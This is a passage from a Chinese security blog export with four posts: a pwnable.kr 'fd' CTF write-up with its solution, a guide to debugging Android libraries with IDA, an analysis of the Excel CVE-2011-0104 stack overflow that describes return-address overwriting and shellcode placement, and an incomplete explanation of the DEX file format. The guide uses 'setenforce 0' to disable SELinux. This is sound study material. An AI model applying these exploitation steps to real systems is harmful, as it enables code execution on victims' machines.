<p>由于个人习惯，会使用file命令查看文件的有关信息，看是32/64位环境运行。然后就是添加权限运行。第一次运行提示缺少参数，第二次运行添加参数，然后报错。接下来就是分析汇编代码。</p>
</blockquote>
<h3 id="汇编代码分析"><a href="#汇编代码分析" class="headerlink" title="汇编代码分析"></a>汇编代码分析</h3><blockquote>
<p>为了提高自己阅读汇编代码的能力，先不直接使用IDA。使用命令<br>objdump -d fd<br>查看代码。反汇编代码如下(仅main部分)：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p6.png" alt=""><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p7.png" alt=""></p>
<blockquote>
<p>简单解释下汇编代码的含义：</p>
</blockquote>
<blockquote>
<p>8048494:          push   %ebp<br>8048495:      mov    %esp,%ebp<br>8048497:    push   %edi<br>8048498:    push   %esi//把ebp压入栈中,保存ebp指向目前的栈顶，把edi和esi压入栈，为了保存寄存器。<br>8048499:and    $0xfffffff0,%esp<br>804849c: sub    $0x20,%esp //开辟栈空间</p>
</blockquote>
<blockquote>
<p>804849f: cmpl   $0x1,0x8$(%ebp)<br> 80484a3: jg     80484bb &lt;main+0x27&gt;<br> //0x8(%ebp)保存着输入的第一个参数，如果没有参数则不跳转。</p>
</blockquote>
<blockquote>
<p>80484a5:    movl   $0x8048630, (%esp)<br> 80484ac:   call   8048380 &lt;puts@plt&gt;<br> 80484b1:   mov    $0x0, %eax<br> 80484b6:   jmp    8048559 &lt;main+0xc5&gt;  //当没有参数时的执行流，输出字符串然后跳转到最后。</p>
</blockquote>
<blockquote>
<p>80484bb:    mov    0xc(%ebp),%eax//当有输入参数的执行流。<br> 80484be:   add    $0x4,%eax<br> 80484c1:    mov    (%eax),%eax<br> 80484c3:   mov    %eax,(%esp)<br> 80484c6:  call   80483d0 &lt;atoi@plt&gt; //将输入的字符串转为数字(十六进制)<br> 80484cb: sub    $0x1234, $eax //eax此刻保存着输入参数的值，十六进制值减去0x1234<br> 80484d0:    mov    %eax,0x18(%esp) //保存数据已经减去0x1234<br> 80484d4: movl    $0x0,0x1c($ %esp)<br> 80484db:    00<br> 80484dc: movl   $0x20,0x8(%esp)//第三个参数<br> 80484e3:  00<br> 80484e4: movl   $ $0x804a060,0x4(%esp)//第二个参数，保存数据的内存位置<br> 80484eb:    08<br> 80484ec: mov    0x18(%esp),%eax<br> 80484f0: mov    %eax,(%esp) //第一个参数（文件描述符）<br> 80484f3: call   8048370 &lt; read@plt&gt;//根据文件描述符来判断输入还是输出<br> 80484f8:    mov    %eax,0x1c(%esp)<br> 80484fc:   mov    $0x8048646, %edx<br> 8048501:   mov    $0x804a060,%eax<br> 8048506:    mov    $ $0xa,%ecx<br> 804850b:     mov    %edx,%esi<br> 804850d:     mov    %eax,%edi<br> 804850f:    repz cmpsb %es:(%edi),%ds:(%esi)<br> 8048511:    seta   %dl<br> 8048514:    setb   %al<br> 8048517:    mov    %edx,%ecx<br> 8048519:    sub    %al,%cl<br> 804851b:      mov    %ecx,%eax<br> 804851d:    movsbl %al,%eax<br> 8048520:    test   %eax,%eax //输入的数据和0x8048060保存的数据作对比<br> 8048522:    jne    8048548 &lt;main+0xb4&gt;//如果正确则输出flag,错误则结束<br> 8048524:    movl   $0x8048650,(%esp)<br> 804852b:   call   8048380 &lt;puts@plt&gt;<br> 8048530:    movl   $0x804865c,(%esp)<br> 8048537:    call   8048390 &lt;system@plt&gt;<br> 804853c:    movl   $0x0,(%esp)<br> 8048543:    call   80483b0 &lt;exit@plt&gt;<br> 8048548:    movl   $0x804866a,(%esp)<br> 804854f:      call   8048380 &lt;puts@plt&gt;<br> 8048554:    mov    $0x0,%eax<br> 8048559:    lea    -0x8(%ebp),%esp<br> 804855c:   pop    %esi<br> 804855d:   pop    %edi<br> 804855e:    pop    %ebp<br> 804855f:    ret  </p>
</blockquote>
<h3 id="文件描述符简介"><a href="#文件描述符简介" class="headerlink" title="文件描述符简介"></a>文件描述符简介</h3><table>
<thead>
<tr>
<th>项文件描述符</th>
<th align="right">缩写</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td align="right">STDIN</td>
<td align="center">标准输入</td>
</tr>
<tr>
<td>1</td>
<td align="right">STDOUT</td>
<td align="center">标准输出</td>
</tr>
<tr>
<td>2</td>
<td align="right">STDERR</td>
<td align="center">标准错误输出</td>
</tr>
</tbody></table>
<blockquote>
<p>通俗讲解：<br>当项文件描述符为0时：可理解为要从键盘输入内存，即为和计算机交互时的输入。<br>当项文件描述符为1时：可理解为从内存显示到显示器，即为和计算机交互时的输出。<br>当项文件描述符为2时：可理解为出现错误时的输出，即为和计算机交互时出现错误会显示到显示器。</p>
</blockquote>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><blockquote>
<ol>
<li>首先要保证有一个参数，不然程序会报错。<ol start="2">
<li>参数减去4660，等于文件描述符。</li>
<li>文件描述符必须为0，这样才会有接下来的输入。</li>
<li>输入会和内存中的数据进行对比。</li>
<li>使用GDB调试可得内存作比较的内容为“LETMEWIN”<br>所以解题为先输入4660，再输入“LETMEWIN”。</li>
</ol>
</li>
</ol>
</blockquote>
<blockquote>
<p>再次使用ssh连接</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p8.png" alt=""></p>
<h3 id="IDA反编译源码"><a href="#IDA反编译源码" class="headerlink" title="IDA反编译源码"></a>IDA反编译源码</h3><blockquote>
<p>可以使用IDA，按下F5反编译源码。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p9.png" alt=""></p>
<blockquote>
<p>fd.c文件代码：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p10.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>这是Pwnable.kr的第一题，分析的比较细致，学到了很多知识。里面的一些东西还不太清楚，希望在以后的学习过程中能有所顿悟。</p>
</blockquote>
<p>个人总结，难免有错。欢迎大佬留言指正，共同交流。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h2><p><a href="https://blog.csdn.net/xlinsist/article/details/51147212" target="_blank" rel="noopener">https://blog.csdn.net/xlinsist/article/details/51147212</a><br> <a href="https://www.cnblogs.com/orlion/p/5765339.html" target="_blank" rel="noopener">https://www.cnblogs.com/orlion/p/5765339.html</a></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA调试动态链接库</title>
    <url>/2018/03/30/IDA%E8%B0%83%E8%AF%95%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>在上篇文章中描述了编写动态链接库的过程，本想把调试部分也添加到里面，考虑到篇幅原因就在这次写了。网上也有很多方法，使用 adb  shell am start……..之类的，但我觉得非虫大佬的最简单实用。这里就简单记录下，免得以后忘。案例使用上次编写的程序JNItest，为了达到效果，特意买了部二手小米手机，刷机到开发版，便于开启root。因为前期的熬夜尝试发现模拟器不支持arm的so调试，这是一个很大的坑。下面开始过程的介绍</p>
</blockquote>
<a id="more"></a>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="拷贝android-server"><a href="#拷贝android-server" class="headerlink" title="拷贝android_server"></a>拷贝android_server</h3><blockquote>
<p>找到IDA的安装路径，打开dbgsrv目录，将android_server拷贝到手机的/data/local/tmp目录下。这里为了避免从C盘的权限，我将android_server先复制到桌面的一个文件夹，然后使用adb上传。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p1.png" alt=""> </p>
<blockquote>
<p>此时手机用数据线链接到电脑的。打开电脑cmd，输入命令</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb push C:&#x2F;Users&#x2F;zzwbi&#x2F;Desktop&#x2F;upload&#x2F;android_server  &#x2F;data&#x2F;local&#x2F;tmp</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p2.png" alt=""> </p>
<h3 id="运行android-server"><a href="#运行android-server" class="headerlink" title="运行android_server"></a>运行android_server</h3><p>运行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell                                 &#x2F;&#x2F;进入手机的shell</span><br><span class="line">cd &#x2F;data&#x2F;local&#x2F;tmp                        &#x2F;&#x2F;进入存放的目录</span><br><span class="line">ls -al                                    &#x2F;&#x2F;查看目录下所有文件及属性</span><br><span class="line">chmod 777 android_server                  &#x2F;&#x2F;修改权限</span><br><span class="line">.&#x2F;android_server                          &#x2F;&#x2F;运行</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p3.png" alt=""> </p>
<blockquote>
<p>过程中可能会有权限限制，建议使用root权限执行以上命令</p>
</blockquote>
<h3 id="进行端口转发"><a href="#进行端口转发" class="headerlink" title="进行端口转发"></a>进行端口转发</h3><blockquote>
<p>新开一个cmd窗口。执行命令adb forward tcp:23946  tcp:23946</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p4.png" alt=""> </p>
<h3 id="使用IDA进行附加"><a href="#使用IDA进行附加" class="headerlink" title="使用IDA进行附加"></a>使用IDA进行附加</h3><blockquote>
<p>首先在手机中打开程序，这样附加时就会有这个进程，不然找不到。<br>启动IDA Pro程序，点击菜单项Debugger—&gt;Attach—&gt;Remote ArmLinux/Android debugger,打开程序设置对话框 </p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p5.png" alt=""> </p>
<blockquote>
<p>但这时可能会弹出一个错误对话框。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p6.png" alt=""> </p>
<blockquote>
<p>这时需要关闭selinux安全机制(需要root权限)。在adb中执行</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p7.png" alt=""> </p>
<blockquote>
<p>关闭后，我们重新附加进程。这时会弹出进程列表。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p8.png" alt=""> </p>
<blockquote>
<p>这里要注意，此时我们要调试的so文件还没有加载到进程中，我们要先在手机界面点击，让so加载到程序中，这样调试时就会有可以找到so文件。<br>这样IDA会出现各种界面，我们留意左上角的那个模块框。放大找到我们要调试的so文件。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p10.png" alt=""> </p>
<blockquote>
<p>双击进入，找到check函数</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p11.png" alt=""> </p>
<blockquote>
<p>点击进入汇编代码，在开始处单击，这样就下好一个断点，程序运行到这里就会停下。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p12.png" alt=""> </p>
<h3 id="开始运行调试"><a href="#开始运行调试" class="headerlink" title="开始运行调试"></a>开始运行调试</h3><blockquote>
<p>此时手机的状态是挂起，屏幕什么的都操作不了，点击IDA左上角的绿色小箭头，程序就可以运行，就能在手机中输入字符。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p14.png" alt=""> </p>
<blockquote>
<p>手机中已经可以输入字符了，输入后就可以单击check，这时程序就会断下</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p15.png" alt=""> </p>
<blockquote>
<p>IDA中显示</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p16.png" alt=""> </p>
<blockquote>
<p>接下来就可以调试了。</p>
</blockquote>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>对于这次so调试，踩了很多坑，模拟器不能调arm的so，这个是收获最大的了。</p>
</blockquote>
<p>个人拙见，错误之处请大佬指正，欢迎留言交流。</p>
]]></content>
      <categories>
        <category>逆向技术学习</category>
      </categories>
      <tags>
        <tag>IDA动态</tag>
        <tag>so调试</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2011-0104漏洞分析</title>
    <url>/2018/07/25/CVE-2011-0104%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
<p>CVE-2011-0104是microsoft excel在解析XLB文件时导致的一个溢出。xlb文件是Excel表格里面的一个设置文件，通常记录用户的操作，并非恶意文件。溢出可导致执行任意代码。本文在分析漏洞的基础上，简单利用漏洞弹出计算器。</p>
</blockquote>
<a id="more"></a>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote>
<p>系统：Windows xp pro sp2<br>软件：windows office 2003<br>调试器：immunity Debugger<br>Poc生成：漏洞战争配套资料</p>
</blockquote>
<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><ul>
<li>打开一个空白的excel程序</li>
<li>打开immunity Debugger,附加excel进程</li>
<li>按下F9将程序运行起来。</li>
<li>在打开的excel中使用file–&gt;open打开配套资料中的exploit.xlb文件。</li>
</ul>
<blockquote>
<p>异常触发：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/1.png" alt="cve-2011-0104"></p>
<blockquote>
<p>可以看到异常是一个访问异常。这时要查找异常产生的源头。向上查看代码，重点关注</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br></pre></td></tr></table></figure>
<blockquote>
<p>以上两个代码是函数开始处的常规操作，向上找可以发现0x300ce252地址处为函数开始。这个就是出错函数的起始位置 </p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/2.png" alt="cve-2011-0104"></p>
<blockquote>
<p>再次重新加载程序，在0x300ce252地址处下断点，并对esp栈顶内存下写入断点。这里对此做一个解释，为什么下这个断点呢。因为漏洞在复制数据时会覆盖此地址，此地址是调用0x300ce252函数的返回地址。一旦数据覆盖进行写入操作，就会触发断点，这就定位到了异常出错位置。</p>
</blockquote>
<ul>
<li>打开一个空白的excel程序</li>
<li>打开immunity Debugger,附加excel进程</li>
<li>使用bp 300ce252命令下断点。</li>
<li>按下F9将程序运行起来。</li>
<li>在打开的excel中使用file–&gt;open打开配套资料中的exploit.xlb文件。</li>
<li>程序断下</li>
</ul>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/3.png" alt="cve-2011-0104"></p>
<blockquote>
<p>内存断点下好后，F9运行，可以看到程序停在了0x300ce3c8地址处，又是一个复制数据出错。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/4.png" alt="cve-2011-0104"></p>
<blockquote>
<p>观察寄存器ebp和edi,之间的大小就是允许复制的数据。计算可得为0x60字节大小。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/5.png" alt="cve-2011-0104"></p>
<blockquote>
<p>分析可知复制了96个字节，edi的值递增覆盖到栈顶0x13aa90,后面利用的跳板地址。单步运行到程序末尾处，返回可以发现是出错复制代码位于call 0x300ce380中。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/6.png" alt="cve-2011-0104"></p>
<blockquote>
<p>为了后面更好的搞清楚栈的覆盖和漏洞利用，有必要梳理下函数调用关系。<br><strong>1.</strong>首先定位在0x300ce252,单步运行程序，一步步通过观察堆栈内容是否覆盖来判断程序调用流程。再次重新加载程序。加载过程同上。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/7.png" alt="cve-2011-0104"></p>
<blockquote>
<p>经过0x302188d8地址处的call excel.306deefe后，栈区被一些乱七八糟的数据填充。可以判断，异常位于这个call中。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/8.png" alt="cve-2011-0104"></p>
<blockquote>
<p><strong>2.</strong>下面要做的就是重新加载程序，在0x302188d8地址处下断点，然后进入call深入分析。<br>进入函数中可以看到。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/9.png" alt="cve-2011-0104"></p>
<blockquote>
<p>梳理总结下流程。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/10.png" alt="cve-2011-0104"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote>
<p>调试分析可以总结得到，数据覆盖的是sub_300ce252函数的返回地址。也就是栈地址0x13aa90。有了返回地址，还要注意到返回时的ret 2c指令，收回了44个空间大小的数据。这样基本就可以完成漏洞利用了。但当程序运行到0x300CE361处的MOV DWORD PTR DS:[EAX],ECX时出现访问违例：访问到一个不可写的地址0x51453844，此时EAX=0x51453844，向上回溯程序，找出EAX的赋值处，发现在0x300CE354处出现给EAX赋值的操作: MOV EAX, DWORD PTR SS:[EBP+2C]，此时EBP=0x0013AA8C,EBP+2C=0x0013AAB8,0x0013AAB8处的值恰好是0x51453844。观察栈中的数据，51453844恰好又是shellcode中的数据。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/11.png" alt="cve-2011-0104"></p>
<blockquote>
<p>根据栈区和样本数据中对应出现的数据，修改相应数值，并添加shellcode。即可利用。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/12.png" alt="cve-2011-0104"></p>
<blockquote>
<p>利用效果</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/13.png" alt="cve-2011-0104"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>这次由于时间原因，写的比较仓促可能具体细节不怎么具体。后续再补上，欢迎交流指导。</p>
</blockquote>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0104" target="_blank" rel="noopener">cve-2011-0104</a><br><a href="https://bbs.pediy.com/thread-217940.htm" target="_blank" rel="noopener">看雪的精品文章</a><br><a href="http://www.cnblogs.com/Ox9A82" target="_blank" rel="noopener">Ox9A82</a><br><a href="https://www.securityfocus.com/bid/47245" target="_blank" rel="noopener">安全焦点</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>文档漏洞</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>Dex文件结构解析</title>
    <url>/2018/04/10/Dex%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>dex是安卓平台上Dalvik虚拟机的可执行文件，相当于windows平台的exe文件。java源文件通过java编译器生成class文件，再通过dx工具转换为classes.dex文件。整体是一个索引的结构，类名，方法名，字段名都存贮在常量池中，减少了存贮空间。为什么要学习dex文件格式呢？就像了解exe病毒分析时需要知道PE文件格式一样。现在越来越多的app都使用了加固技术以防止app被轻易反编译，当要对一个加固的恶意app分析就要了解dex文件格式。所以dex文件格式是基础中的基础。</p>
</blockquote>
<a id="more"></a>
<h2 id="文件基本结构"><a href="#文件基本结构" class="headerlink" title="文件基本结构"></a>文件基本结构</h2><blockquote>
<p>对于dex文件分析，最好用的工具就是010Editor了，因为他有模板可以分析相对应的结构。随意找一个apk，后缀改为zip后解压，将dex文件使用010Editor打开。然后使用模板进行分析，有些可能会报错(变量定义前使用local)。分析效果如下：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180409/p1.png" alt=""></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">含义</th>
<th align="center">名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center">文件头</td>
<td align="center">Header</td>
<td align="center">文件头</td>
</tr>
<tr>
<td align="center">索引区</td>
<td align="center">String_ids</td>
<td align="center">字符串索引</td>
</tr>
<tr>
<td align="center">索引区</td>
<td align="center">Type_ids</td>
<td align="center">类型的索引</td>
</tr>
<tr>
<td align="center">索引区</td>
<td align="center">Proto_ids</td>
<td align="center">方法原型的索引</td>
</tr>
<tr>
<td align="center">索引区</td>
<td align="center">Field_ids</td>
<td align="center">域的索引</td>
</tr>
<tr>
<td align="center">索引区</td>
<td align="center">Method_ids</td>
<td align="center">方法的索引</td>
</tr>
<tr>
<td align="center">数据区</td>
<td align="center">Class_dets</td>
<td align="center">类的定义区</td>
</tr>
<tr>
<td align="center">数据区</td>
<td align="center">Data</td>
<td align="center">数据区</td>
</tr>
<tr>
<td align="center">数据区</td>
<td align="center">Link_data</td>
<td align="center">链接数据区</td>
</tr>
</tbody></table>
<blockquote>
<p>这里再介绍一下dex使用到的数据结构<br>| 类型       | 含义   |<br>| :——–:  | :—–:  |<br>| u1     | uint8_t， 1字节的无符号数 |<br>| u2        |   uint16_t， 2字节的无符号数  |<br>| u4      |    uint32_t，  4字节的无符号数  |<br>| u8       |   uint64_t，  8字节的无符号数   |<br>| sleb128        |    有符号LEB128，可变长度1<del>5字节    |<br>| uleb128       |    无符号LEB128，可变长度1</del>5字节    |<br>| uleb128p1      |    无符号LEB128+1，可变长度1~5字节    | </p>
</blockquote>
<h2 id="Header文件头"><a href="#Header文件头" class="headerlink" title="Header文件头"></a>Header文件头</h2><p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180409/p2.png" alt=""></p>
<blockquote>
<p>header头记录了dex文件的一些基本信息，包括魔数字段，alder校验值，sha哈希值等，这三个字段在apk加壳中会用到。下面是详细解释：</p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">字段名称</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">magic</td>
<td align="center">8个字节，dex 035 或者dex 036</td>
</tr>
<tr>
<td align="center">checksum</td>
<td align="center">文件校验码(校验除去magic和checksum的所有文件区域)</td>
</tr>
<tr>
<td align="center">signature</td>
<td align="center">SHA-1哈希值uint32_t，  4字节的无符号数</td>
</tr>
<tr>
<td align="center">filesize</td>
<td align="center">DEX文件大小</td>
</tr>
<tr>
<td align="center">headersize</td>
<td align="center">header大小，一般为0x70字节</td>
</tr>
<tr>
<td align="center">endian  tag</td>
<td align="center">指定运行环境的字节序，默认小端</td>
</tr>
<tr>
<td align="center">linksize</td>
<td align="center">链接段的大小, 默认为0表示静态链接</td>
</tr>
<tr>
<td align="center">linkoff</td>
<td align="center">链接段开始偏移</td>
</tr>
<tr>
<td align="center">mapoff</td>
<td align="center">DexMapList的文件偏移</td>
</tr>
<tr>
<td align="center">stringsize</td>
<td align="center">字符串列表中的字符串个数</td>
</tr>
<tr>
<td align="center">stringidsoff</td>
<td align="center">字符串列表中的字符串偏移</td>
</tr>
<tr>
<td align="center">typeIdsSize</td>
<td align="center">数据类型索引个数</td>
</tr>
<tr>
<td align="center">typeIdsOff</td>
<td align="center">数据类型索引偏移</td>
</tr>
<tr>
<td align="center">protoIdsSize</td>
<td align="center">方法原型个数</td>
</tr>
<tr>
<td align="center">protoIdsOff</td>
<td align="center">方法原型位置偏移</td>
</tr>
<tr>
<td align="center">fieldIdsSize</td>
<td align="center">字段列表中的个数</td>
</tr>
<tr>
<td align="center">fieldIdsOff</td>
<td align="center">字段列表偏移</td>
</tr>
<tr>
<td align="center">methodIdsSize</td>
<td align="center">方法列表中的个数</td>
</tr>
<tr>
<td align="center">methodIdsOff</td>
<td align="center">方法列表偏移</td>
</tr>
<tr>
<td align="center">classDefsSize</td>
<td align="center">类定义列表中的个数</td>
</tr>
<tr>
<td align="center">classDefsOff</td>
<td align="center">类定义列表偏移</td>
</tr>
<tr>
<td align="center">dataSize</td>
<td align="center">数据段的大小, 4字节对齐</td>
</tr>
<tr>
<td align="center">dataOff</td>
<td align="center">数据段偏移</td>
</tr>
</tbody></table>
<blockquote>
<p>因为很多后半部分很多都是相对应的数据个数及地址偏移。这里就以StringSize和StringOff为例。从图上可以看到Stringsize的值为3672(十进制)，也就是说有3672个字符串。打开String_ids索引区，可以看到：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180409/p3.png" alt=""></p>
<blockquote>
<p>而StringOff则保存着其偏移地址，以上图为例StringOff地址值为112(0x70)。我们来到0x70处，可以看到其保存的数据索引地址为0x2f9fc。那究竟0x2f9fc地址有没有保存数据呢？</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180409/p4.png" alt=""></p>
<blockquote>
<p>正好和上文的匹配。其他的也是同样道理。</p>
</blockquote>
<h2 id="dex-string-ids索引段-字符串"><a href="#dex-string-ids索引段-字符串" class="headerlink" title="dex string ids索引段(字符串)"></a>dex string ids索引段(字符串)</h2><blockquote>
<p>字符串索引区描述dex文件中所有的字符串信息</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Direct-mapped &quot;string_id_item&quot;.</span><br><span class="line">struct DexStringId </span><br><span class="line">&#123;</span><br><span class="line">    u4 stringDataOff;      &#x2F;&#x2F;file offset to string_data_item</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>而stringDataOff是一个偏移地址，他指向数据结构item string data</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct string_data_item</span><br><span class="line">&#123;</span><br><span class="line">uleb128 utf16_size;  这里用到了前面的LEB128 可变字节类型！</span><br><span class="line">ubyte data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180409/p5.png" alt=""></p>
<blockquote>
<p>这里对LEB128做一个简单介绍：LEB128是Dex中特有的用来存贮最大32位数的数据类型，其特点是由1-5个字节组成。每个字节的第一位用来表示是否用到下个字节，剩下的7位是有效位，所以第五个字节的首位要为0。有符号LEB128的符号由最后字节的有效位的最高位决定，即最后字节的第二位。<br>实现过程：</p>
</blockquote>
<ol>
<li>将一个整数用的二进制表示。</li>
<li>以四个为一组，在头部添加零，将其扩展为7的整数倍。</li>
<li>然后按照7位一组，从最低有效位到最高有效位方向，在每组的头部添加一位构成一个字节，最高有效位添加0。</li>
<li>然后将这组顺序进行反转，得到这一整数的LEB128编码。</li>
</ol>
<blockquote>
<p>举例如下：<br>0x98765=10011000011101100101 把它补成7的倍数010011000011101100101然后按7位分组0100110  0001110  1100101然后在每组前加一位1，第一组加0得出 00100110 10001110 11100101 也就是0x268ee5</p>
</blockquote>
<h2 id="dex-type-ids索引区-类名-类型名称字符串"><a href="#dex-type-ids索引区-类名-类型名称字符串" class="headerlink" title="dex type ids索引区(类名/类型名称字符串)"></a>dex type ids索引区(类名/类型名称字符串)</h2><blockquote>
<p>包括class类型，数组类型，基本类型等。其结构体描述如下：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct type_ids_item</span><br><span class="line">&#123;</span><br><span class="line">    uint descriptor_idx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="dex-proto-ids索引区-方法声明"><a href="#dex-proto-ids索引区-方法声明" class="headerlink" title="dex proto ids索引区(方法声明)"></a>dex proto ids索引区(方法声明)</h2><blockquote>
<p>方法声明=返回类型+参数列表</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct DexProtoId </span><br><span class="line">&#123;</span><br><span class="line">    u4 shortyIdx;   &#x2F;* 指向DexStringId列表的索引 *&#x2F;</span><br><span class="line">    u4 returnTypeIdx;   &#x2F;* 指向DexTypeId列表的索引 *&#x2F;</span><br><span class="line">    u4 parametersOff;   &#x2F;* 指向DexTypeList的偏移 *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>shortyldx:方法声明字符串，由方法的返回类型与参数列表组成的一个字符串，且返回值类型位于参数列表之前。<br>returnTypeIdx：方法返回类型，指向DexTypeId列表。<br>parametersOff：指向一个DexTypeList结构体，存放了方法的参数类型。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct DexTypeList &#123;</span><br><span class="line">    u4 size;             &#x2F;* 接下来DexTypeItem的个数 *&#x2F;</span><br><span class="line">    DexTypeItem list[1]; &#x2F;* DexTypeItem结构 *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>size:DexTypeItem结构的个数，参数数量。<br>list:指向size个方法的参数。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct DexTypeItem &#123;</span><br><span class="line">    u2 typeIdx;    &#x2F;* 指向DexTypeId列表的索引 *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
